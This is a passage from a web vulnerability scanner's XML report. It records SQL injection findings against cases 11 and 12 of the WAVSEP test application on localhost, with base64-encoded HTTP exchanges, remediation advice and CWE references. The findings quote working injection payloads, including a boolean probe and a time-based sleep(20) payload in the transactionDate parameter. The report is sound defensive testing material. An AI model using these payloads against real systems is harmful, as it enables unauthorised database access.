MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMScn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjIyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA2MDkNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMTUzOTQ5MDA1JTIwb3IlMjAyNzk5JTNkMDI3OTk=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNDM0DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjQzIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICcyMDEwLTAxLTAxNTM5NDkwMDUgb3IgMjc5OT0wMjc5OScKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTEtSW5qZWN0aW9uSW5WaWV3LURhdGUtUGVybWlzc2lvbkJ5cGFzcy1XaXRoMjAwRXJyb3JzLmpzcCBIVFRQLzEuMQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFgxMTsgVWJ1bnR1OyBMaW51eCB4ODZfNjQ7IHJ2OjEwOC4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwOC4wDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUsIGJyDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LGltYWdlL2F2aWYsaW1hZ2Uvd2VicCwqLyo7cT0wLjgNCkNvbm5lY3Rpb246IGNsb3NlDQpIb3N0OiAxMjcuMC4wLjE6MTgwODANCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkNvbnRlbnQtVHlwZTogYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkDQpDb250ZW50LUxlbmd0aDogMjYNCk9yaWdpbjogaHR0cDovLzEyNy4wLjAuMToxODA4MA0KUmVmZXJlcjogaHR0cDovLzEyNy4wLjAuMToxODA4MC93YXZzZXAvYWN0aXZlL1NRTC1JbmplY3Rpb24vU0luamVjdGlvbi1EZXRlY3Rpb24tRXZhbHVhdGlvbi1QT1NULTIwMEVycm9yL0Nhc2UxMS1JbmplY3Rpb25JblZpZXctRGF0ZS1QZXJtaXNzaW9uQnlwYXNzLVdpdGgyMDBFcnJvcnMuanNwDQpDb29raWU6IEpTRVNTSU9OSUQ9NEVFOUFDRDk2QjQ1NkVDQ0U5RjUyQkJBNzgxRTJGMUQNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1GZXRjaC1EZXN0OiBkb2N1bWVudA0KU2VjLUZldGNoLU1vZGU6IG5hdmlnYXRlDQpTZWMtRmV0Y2gtU2l0ZTogc2FtZS1vcmlnaW4NClNlYy1GZXRjaC1Vc2VyOiA/MQ0KDQp0cmFuc2FjdGlvbkRhdGU9MjAxMC0wMS0wMSclMmIoc2VsZWN0KmZyb20oc2VsZWN0KHNsZWVwKDIwKSkpYSklMmIn]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUyOjQyIEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1MTUNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTEgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBwcml2YXRlIHJlc291cmNlIHZpZXcgcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPC9UQUJMRT4KCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>2793481075405322240</serialNumber>
    <type>1049088</type>
    <name><![CDATA[SQL injection]]></name>
    <host ip="127.0.0.1">http://127.0.0.1:18080</host>
    <path><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp]]></path>
    <location><![CDATA[/wavsep/active/SQL-Injection/SInjection-Detection-Evaluation-POST-200Error/Case12-InjectionInSearch-Date-UnionExploit-With200Errors.jsp [transactionDate parameter]]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>SQL injection vulnerabilities arise when user-controllable data is incorporated into database SQL queries in an unsafe manner. An attacker can supply crafted input to break out of the data context in which their input appears and interfere with the structure of the surrounding query.</p>
<p>A wide range of damaging attacks can often be delivered via SQL injection, including reading or modifying critical application data, interfering with application logic, escalating privileges within the database and taking control of the database server. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>The most effective way to prevent SQL injection attacks is to use parameterized queries (also known as prepared statements) for all database access. This method uses two steps to incorporate potentially tainted data into SQL queries: first, the application specifies the structure of the query, leaving placeholders for each item of user input; second, the application specifies the contents of each placeholder. Because the structure of the query has already been defined in the first step, it is not possible for malformed data in the second step to interfere with the query structure. You should review the documentation for your database and application platform to determine the appropriate APIs which you can use to perform parameterized queries. It is strongly recommended that you parameterize <i>every</i> variable data item that is incorporated into database queries, even if it is not obviously tainted, to prevent oversights occurring and avoid vulnerabilities being introduced by changes elsewhere within the code base of the application.</p>
<p>You should be aware that some commonly employed and recommended mitigations for SQL injection vulnerabilities are not always effective: </p>
<ul>
  <li>One common defense is to double up any single quotation marks appearing within user input before incorporating that input into a SQL query. This defense is designed to prevent malformed data from terminating the string into which it is inserted. However, if the data being incorporated into queries is numeric, then the defense may fail, because numeric data may not be encapsulated within quotes, in which case only a space is required to break out of the data context and interfere with the query. Further, in second-order SQL injection attacks, data that has been safely escaped when initially inserted into the database is subsequently read from the database and then passed back to it again. Quotation marks that have been doubled up initially will return to their original form when the data is reused, allowing the defense to be bypassed.</li>
  <li>Another often cited defense is to use stored procedures for database access. While stored procedures can provide security benefits, they are not guaranteed to prevent SQL injection attacks. The same kinds of vulnerabilities that arise within standard dynamic SQL queries can arise if any SQL is dynamically constructed within stored procedures. Further, even if the procedure is sound, SQL injection can arise if the procedure is invoked in an unsafe manner using user-controllable data.</li>
</ul>]]></remediationBackground>
    <references><![CDATA[<ul>
<li><a href="https://portswigger.net/web-security/sql-injection">Web Security Academy: SQL injection</a></li>
<li><a href="https://support.portswigger.net/customer/portal/articles/1965677-using-burp-to-test-for-injection-flaws">Using Burp to Test for Injection Flaws</a></li>
<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet">Web Security Academy: SQL Injection Cheat Sheet</a></li>
</ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/94.html">CWE-94: Improper Control of Generation of Code ('Code Injection')</a></li>
<li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li>
  <li><a href="https://capec.mitre.org/data/definitions/66.html">CAPEC-66: SQL Injection</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The <b>transactionDate</b> parameter appears to be vulnerable to SQL injection attacks. A single quote was submitted in the transactionDate parameter, and a database error message was returned. Two single quotes were then submitted and the error message disappeared. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>71604574 or 4799=04799</b> was submitted in the transactionDate parameter, and a database error message was returned. You should review the contents of the error message, and the application's handling of other input, to confirm whether a vulnerability is present.<br><br> Additionally, the payload <b>'+(select*from(select(sleep(20)))a)+'</b> was submitted in the transactionDate parameter. The application took <b>20002</b> milliseconds to respond to the request, compared with <b>0</b> milliseconds for the original request, indicating that the injected SQL command caused a time delay.<br><br>The database appears to be MySQL.]]></issueDetail>
    <remediationDetail><![CDATA[The application should handle errors gracefully and prevent SQL error messages from being returned in responses. ]]></remediationDetail>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJw==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNTMzDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTFN5bnRheEVycm9yRXhjZXB0aW9uOiBZb3UgaGF2ZSBhbiBlcnJvciBpbiB5b3VyIFNRTCBzeW50YXg7IGNoZWNrIHRoZSBtYW51YWwgdGhhdCBjb3JyZXNwb25kcyB0byB5b3VyIE15U1FMIHNlcnZlciB2ZXJzaW9uIGZvciB0aGUgcmlnaHQgc3ludGF4IHRvIHVzZSBuZWFyICcnMjAxMC0wMS0wMScnJyBhdCBsaW5lIDEKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxJyc=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjUzOjM3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCkNvbnRlbnQtTGVuZ3RoOiA1OTQNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKVGhlIGxpc3Qgb2YgdHJhbnNhY3Rpb25zOgo8VEFCTEU+CjxUUj4KPFREPgo8Qj4KdHJhbnNhY3Rpb25JZAo8L0I+CjwvVEQ+CjxURD4KPEI+CnN1bQo8L0I+CjwvVEQ+CjxURD4KPEI+CmRlc2NyaXB0aW9uCjwvQj4KPC9URD4KPFREPgo8Qj4KdHJhbnNhY3Rpb25EYXRlCjwvQj4KPC9URD4KPC9UUj4KPFRSPgo8VEQ+CjEzMgo8L1REPgo8VEQ+CjEwMDAKPC9URD4KPFREPgpTaW1wbGUgVHJhbnNhY3Rpb24KPC9URD4KPFREPgoyMDEwLTAxLTAxCjwvVEQ+CjwvVFI+CjwvVEFCTEU+CgoKPC9ib2R5Pgo8L2h0bWw+]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZA0KQ29udGVudC1MZW5ndGg6IDI2DQpPcmlnaW46IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODANClJlZmVyZXI6IGh0dHA6Ly8xMjcuMC4wLjE6MTgwODAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3ANCkNvb2tpZTogSlNFU1NJT05JRD00RUU5QUNEOTZCNDU2RUNDRTlGNTJCQkE3ODFFMkYxRA0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KU2VjLUZldGNoLURlc3Q6IGRvY3VtZW50DQpTZWMtRmV0Y2gtTW9kZTogbmF2aWdhdGUNClNlYy1GZXRjaC1TaXRlOiBzYW1lLW9yaWdpbg0KU2VjLUZldGNoLVVzZXI6ID8xDQoNCnRyYW5zYWN0aW9uRGF0ZT0yMDEwLTAxLTAxNzE2MDQ1NzQlMjBvciUyMDQ3OTklM2QwNDc5OQ==]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIA0KQ29udGVudC1UeXBlOiB0ZXh0L2h0bWw7Y2hhcnNldD1JU08tODg1OS0xDQpDb250ZW50LUxlbmd0aDogNDE5DQpEYXRlOiBUdWUsIDIzIEFwciAyMDI0IDA4OjU0OjU3IEdNVA0KQ29ubmVjdGlvbjogY2xvc2UNCg0KCgo8IURPQ1RZUEUgaHRtbCBQVUJMSUMgIi0vL1czQy8vRFREIEhUTUwgNC4wMSBUcmFuc2l0aW9uYWwvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvVFIvaHRtbDQvbG9vc2UuZHRkIj4KPGh0bWw+CjxoZWFkPgo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1JU08tODg1OS0xIj4KPHRpdGxlPkNhc2UgMTIgLSBJbmplY3Rpb24gaW50byBhIGRhdGUgdmFsdWUgaW4gYSBzZWFyY2ggcGFnZSB3aXRoIGVycm9uZW91cyByZXNwb25zZXM8L3RpdGxlPgo8L2hlYWQ+Cjxib2R5PgoKRXhjZXB0aW9uIGRldGFpbHM6IGphdmEuc3FsLlNRTEV4Y2VwdGlvbjogSW5jb3JyZWN0IERBVEUgdmFsdWU6ICcyMDEwLTAxLTAxNzE2MDQ1NzQgb3IgNDc5OT0wNDc5OScKCgo8L2JvZHk+CjwvaHRtbD4=]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
    <requestresponse>
      <request method="POST" base64="true"><![CDATA[UE9TVCAvd2F2c2VwL2FjdGl2ZS9TUUwtSW5qZWN0aW9uL1NJbmplY3Rpb24tRGV0ZWN0aW9uLUV2YWx1YXRpb24tUE9TVC0yMDBFcnJvci9DYXNlMTItSW5qZWN0aW9uSW5TZWFyY2gtRGF0ZS1VbmlvbkV4cGxvaXQtV2l0aDIwMEVycm9ycy5qc3AgSFRUUC8xLjENClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IFVidW50dTsgTGludXggeDg2XzY0OyBydjoxMDguMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC8xMDguMA0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsKi8qO3E9MC44DQpDb25uZWN0aW9uOiBjbG9zZQ0KSG9zdDogMTI3LjAuMC4xOjE4MDgwDQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2Rl